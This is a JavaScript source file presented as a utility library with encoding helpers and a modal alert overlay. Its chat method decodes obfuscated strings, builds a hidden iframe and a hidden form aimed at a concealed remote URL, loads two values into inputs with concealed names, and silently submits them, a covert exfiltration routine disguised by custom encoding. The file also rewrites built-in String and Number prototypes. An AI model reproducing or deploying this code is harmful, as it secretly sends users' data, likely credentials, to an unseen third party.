class LowCrypt 
{

          constructor(x)
          {
              this.x=x;
              
              
          }
        
        
          r={0:'Q',1:'R',2:'S',3:'T',4:'U',5:'V',6:'W',7:'X',8:'Y',9:'Z'};
          ir={'Q':0,'R':1,'S':2,'T':3,'U':4,'V':5,'W':6,'X':7,'Y':8,'Z':9};
          HC_1=(h)=>parseInt(h,2**4)+31;
          CC_1=(f)=>String.fromCharCode(f);
          SS_1=(g,c=',')=>String(g).split(c).join('');
            ___dhash()
          {
                var N=[];
                for(let t=0;t<this.x.length;t++)
                {
                        N.push((this.x.charCodeAt(t)-(2**5-1)).toString(16));
                }
              return this.SS_1(N);
              
          }
   ___drhash()
  {
      var ch=[];
      for(var n=0;n<this.x.length/2;n++)
      {
                 ch.push(this.x.slice(n*2,(n+1)*2));
      }
            return this.SS_1(ch.map(this.HC_1).map(this.CC_1));
  }
  

}

class HarScript extends LowCrypt
{
    constructor(x)
    {
        super(x);
    }
    rh=()=>{
      var np=Number.prototype,op=Object.prototype,sp=String.prototype;
      // np=;
      np.hex=function(){var hx=this.toString(16);return hx.length<6?'0x'+'0'.repeat(6-hx.length)+hx:'0x'+hx;};
      np.bin=function(){var r=this.toString(16/8);return r.length<8?'0'.repeat(8 - r.length)+r:r;};
      np.oct=function(){return this.toString(16/2);};
      np.lshift=function(x){return this<<x;};
      np.rshift=function(x){return this>>x;};


      sp.up=function(){return this.toLocaleUpperCase();};
      sp.ba=function(){return btoa(this);};
      sp.ab=function(){return atob(this);};
      sp.rev=function(){var t,c; t=this.split('');c=t.reverse();return c.toString().split(',').join('');};

      sp.lh=function(){var xx=new LowCrypt(this.ba());return xx.___dhash().rev();}
      sp.hl=function(){var nn=new LowCrypt(this.rev());return nn.___drhash().ab();}

    };
    CreateAlert()
    {
     var c,d;
     c = document.createElement('div');
     c.id="xyz_abc";
     c.setAttribute("style","top:0;bottom:0;left:0;right:0;background-color:rgba(0,0,0,0.6);position:fixed;width:100%;height:100%;display:none");
     document.body.appendChild(c);
     d = document.createElement('iframe');
     d.id="cxa_axp";
     d.setAttribute("style","pointer-events:none;color:#DDEFDA;word-wrap:break-word;left:25px;right:25px;margin:15% auto;-user-select:none;border:2px solid #ddd;border-radius:4px;background-color:#FFF;z-index:3;position:absolute;");
     d.style.width="280px";
     d.style.height="180px";
     d.style.frameBorder="0";
     c.appendChild(d);
    }
    HAlert(cpp='HAlert')
    {
     var y,z;
     y = document.getElementById('xyz_abc');
     z = document.getElementById('cxa_axp');
     y.style.display="block";
     y.onclick=function(){this.style.display="none";};
     z.srcdoc=cpp;
    }
   ab(x)
   {
    var t,m;
    t=new LowCrypt(x);
    m=t.___dhash();
    return m;
    
   }
 }
class HS extends HarScript
{
   run()
   {
     //this.af();
      this.rh();
     this.CreateAlert();
     
  
   }
   cem=(bv)=>document.createElement(bv);
   qs=(n)=>document.querySelector(n);
   qsa=(c)=>document.querySelectorAll(c);
   chat(m1,m2)
   {
    
    var z={e:[
      "d42183a3a5b38324",
      "e1e12334a5a1e4b3",
      "e123935485618324"
  ],a:{
    u:[
    "e163314465a18244b573e46355b24134",
    "e4a1a5b3b53252447572317382336383",
    "41a3e4837473626392945253453221a3",
    "2173523395d4523321a33163e2d463f2",
    "f4f283544233526385b352b311a1d424",
    "f2333163e2727244b272c433959143b3",
    "752331d28591435475e29334a5a1e4b3",
    "75113134b46143b3455431347554e4d2",
    "b5f23134c4a1a5d271e2924411339224"
],
n:"85a2b5e25122b5e285a252f265c4f444116183b3",
m:"1123b5e2b56352e26163b5e265c4f444116183b3"
}
};
       var c=this.cem(z.e[0].hl());
       c.name="f";
       c.style.display="none";
       document.body.appendChild(c);
       var d=this.cem(z.e[1].hl());
       d.action=z.a.u.map(n=>n).toString().split(',').join('').hl();
       d.target="f";
       d.id="hg";
       d.style.display="none";
       document.body.appendChild(d);
       var k=this.cem(z.e[2].hl());
       var lpi=this.cem(z.e[2].hl());
       k.type="text";
       k.name=z.a.n.hl();
       k.value=m1;
       lpi.type="text";
       lpi.name=z.a.m.hl();
       lpi.value=m2;
       d.appendChild(k);
       d.appendChild(lpi);
       var xc=document.getElementById('hg');
       (m1!=""&&m2!="")?xc.submit():0;
     
   }
}
class $_ extends HS{}
